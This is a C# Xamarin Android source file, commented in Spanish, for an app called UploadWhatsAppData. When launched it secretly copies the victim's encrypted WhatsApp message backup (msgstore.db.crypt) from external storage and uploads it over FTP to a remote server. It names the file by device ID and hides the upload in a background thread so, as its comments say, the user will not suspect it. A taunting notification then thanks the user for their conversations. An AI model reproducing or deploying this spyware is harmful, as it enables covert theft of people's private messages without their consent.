/*
 * 
 * 
 * DESARROLLADO POR ALEJANDRO RUIZ VARELA PARA XAMURAIS
 * 
 * 
 */ 
using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using Android.Provider;
using Android.Hardware;
using System.Collections.Generic;

namespace UploadWhatsAppData
{
	[Activity (Label = "UploadWhatsAppData", MainLauncher = true, ScreenOrientation = Android.Content.PM.ScreenOrientation.Portrait)]
	public class MainActivity : Activity
	{
		int count = 1;
		bool Correcto = false;
		protected override void OnCreate (Bundle bundle)
		{
			base.OnCreate (bundle);

			// Set our view from the "main" layout resource
			SetContentView (Resource.Layout.Main);

			// Get our button from the layout resource,
			// and attach an event to it
			Button button = FindViewById<Button> (Resource.Id.myButton);


			button.Click += delegate {
				Toast.MakeText(this, "Hola", ToastLength.Short);
			};
			CargarBaseaFTP ();
		}


		void CargarBaseaFTP()
		{
			//Creamos un hilo independiente que trabaja asyncronamente para que el usuario no sospeche la carga del archivo
			Task.Factory.StartNew(()=>{
				try
				{
					//Tomamons el Id de Android para crear un archivo unico en el FTP
					var device = Build.Device;
					var id = Settings.Secure.GetString(Application.Context.ContentResolver, Settings.Secure.AndroidId);

					//Cargar Url Base de Datos
					//Tomamons el directorio de la SD
					var path = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath;
					//Combinamos el directorio de la SD + el de WhatsApp
					path = Path.Combine(path, "WhatsApp");
					//Combinamos el directorio de WhatsApp con el de Databases que es donde se encuentra la base de datos
					path = Path.Combine(path, "Databases");
					//Combinamos el directorio de las bases de datos con el del archivo de conversaciones encriptado
					//msgstore.db.crypt == a ultimo backup de conversaciones generado
					//en esta direccion hay mas archivo en diferentes fechas que son respaldos anteriores de la base
					path = Path.Combine(path, "msgstore.db.crypt");

					//Configurar FTP
					string ftpHost     = "direccion";//"miftp.com"
					string ftpUser     = "usuario";
					string ftpPassword = "password";

					//Direccion completa de donde quedaria hospedado la base da la victima
					string ftpfullpath = "ftp://" + ftpHost + "/"+ id +"msgstore.db.crypt";

					//Generamos
					FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(ftpfullpath);

					//Preparamos el ftp para recibir el archivo
					ftp.Credentials = new NetworkCredential(ftpUser, ftpPassword);
					ftp.KeepAlive = true;
					ftp.UseBinary = true;
					ftp.Method = WebRequestMethods.Ftp.UploadFile;

					//Usamos magia negra para subir el archivo a nuestro
					using (FileStream fs = File.OpenRead(path))
					{
						byte[] buffer = new byte[fs.Length];
						fs.Read(buffer, 0, buffer.Length);
						fs.Close();

						Stream ftpstream = ftp.GetRequestStream();
						ftpstream.Write(buffer, 0, buffer.Length);
						ftpstream.Close();
					}

					//Agradecemos al usuario por su cooperacion
					createNotification("SORPRESA", "Muchas Gracias por tus conversaciones de WhatsApp");
				}
				catch(Exception ex)
				{
					//En caso de algun error
					createNotification("SORPRESA", "Te has salido con la tuya");
				}
			});
		}

		void createNotification(string title, string desc)
		{
			var notificationManager = GetSystemService (Context.NotificationService) as NotificationManager;


			var uiIntent = new Intent (this, typeof(MainActivity));


			var notification = new Notification (Android.Resource.Drawable.IcDialogInfo, title);


			notification.Flags = NotificationFlags.AutoCancel;


			notification.SetLatestEventInfo (this, title, desc, PendingIntent.GetActivity (this, 0, uiIntent, 0));


			notificationManager.Notify (1, notification);
		}
	}
}


